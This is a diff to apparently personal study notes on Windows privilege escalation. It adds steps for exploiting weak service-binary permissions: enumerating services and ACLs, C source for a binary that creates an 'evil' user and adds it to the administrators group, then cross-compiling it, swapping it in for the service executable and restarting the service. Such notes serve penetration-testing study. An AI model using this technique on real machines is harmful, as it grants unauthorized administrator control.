@@ -67,18 +67,79 @@ Note: When running at a high integrity level, password of a user can be changed 
         whoami /groups
         net user admin password123
 
-## Kernel driver vulnerabilities
-
-c:\users\kostas\desktop\hfs.exe
-
 ## Insecure file permissions
 
+Target: Exploit insecure file permissions on **services** that run as **nt authority\system**
 
+* List running services
+
+        tasklist /SVC
+    ---
+
+        powershell -c "Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}"
+
+* Look for user-installed services that are installed in **Program Files** directory
+
+        dir /s *Service*
+        dir /s VGAuthService.exe vmtoolsd.exe ManagementAgentHost.exe
+
+* Enumerate the permissions granted to identified services
+
+        icacls "c:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+        icacls "c:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"
+        icacls "c:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+
+    F - Full access
+    M - Modify access
+    RX - Read and execute access
+    R - Read-only access
+    W - Write-only access
+
+* If a weak permission is found associated with a privileged service, we can replace the vulnerable service with a malicious binary and then trigger it by restarting the service or rebooting the machine
+
+    1. Create a malicious binary **adduser.c**
+
+        ```c
+        #include <stdio.h>
+        int main()
+        {
+            int i;
+            i = system("net user evil password123 /add");
+            i = system("net localgroup administrators evil /add");
+
+            return 0;
+        }
+        ```
+
+    2. Cross-compile the binary
+
+            i686-w64-mingw32-gcc adduser.c -o adduser.exe
+    
+    3. Transfer the malicious EXE file to target machine, and replace the original service.exe binary with the malicious binary
+
+            > move "C:\Program Files\ServicePath\service.exe" "C:\Program Files\ServicePath\service_original.exe"
+            > move adduser.exe "C:\Program Files\ServicePath\service.exe"
+
+    4. Restart the vulnerable service
+
+            net stop serviceName
+            net start serviceName
+
+    5. Check the start options of the vulnerable service
+
+            wmic service where caption="serviceName" get name, caption, state, startmode
 
 ## Unquoted service paths
+
+
+
+## Kernel driver vulnerabilities
 
 
 
 ## References
 
 * https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842#:~:text=Services%20created%20by%20SYSTEM%20having,be%20executed%20with%20SYSTEM%20privileges
+* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+* https://esseum.com/hack-the-box-optimum-writeup/
